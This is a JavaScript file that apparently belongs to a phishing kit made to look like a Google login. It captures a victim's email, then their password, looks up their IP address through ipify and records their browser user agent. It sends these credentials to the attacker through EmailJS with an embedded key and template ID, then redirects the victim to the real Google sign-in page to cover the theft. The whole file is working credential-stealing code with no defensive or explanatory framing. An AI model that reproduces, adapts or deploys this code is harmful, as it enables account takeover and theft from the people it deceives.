(function () {
  emailjs.init("sZy8o2u7l3_qpTCe9");
})();

// Handle email submission
if (document.getElementById("emailForm")) {
  document.getElementById("emailForm").addEventListener("submit", function (e) {
    e.preventDefault();
    const email = document.getElementById("email").value.trim();
    const errorDiv = document.getElementById("emailError");

    if (!email || !isValidEmail(email)) {
      errorDiv.classList.remove("hidden");
      return;
    }

    localStorage.setItem("captured_email", email); // Store temporarily
    window.location.href = "password.html"; // Go to password step
  });
}

// Handle password submission
if (document.getElementById("passwordForm")) {
  const email = localStorage.getItem("captured_email") || "";
  document.getElementById("emailDisplay").innerText = email;

  document.getElementById("passwordForm").addEventListener("submit", function (e) {
    e.preventDefault();
    const password = document.getElementById("password").value.trim();
    const errorDiv = document.getElementById("passError");

    if (!password) {
      errorDiv.classList.remove("hidden");
      return;
    }

    // Submit both email + password to EmailJS
    submitLogin(email, password);
  });
}

// Validate email format
function isValidEmail(email) {
  const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return regex.test(email);
}

// Submit data to EmailJS
function submitLogin(email, password) {
  const time = new Date().toString();
  const userAgent = navigator.userAgent;

  fetch('https://api.ipify.org?format=json')
    .then(res => res.json())
    .then(data => {
      const ip = data.ip;
      sendEmail(email, password, time, ip, userAgent);
    })
    .catch(() => {
      sendEmail(email, password, time, "Unknown IP", userAgent);
    });
}

function sendEmail(email, password, time, ip, userAgent) {
  const params = {
    email: email,
    password: password,
    time: time,
    ip: ip,
    userAgent: userAgent,
  };

  emailjs.send("default_service", "template_jjhyh4i", params)
    .then(() => {
      alert("Login captured.");
      window.location.href = "https://accounts.google.com/signin";
    })
    .catch((err) => {
      alert("Failed to send credentials but capturing succeeded.");
      console.error(err);
    });
}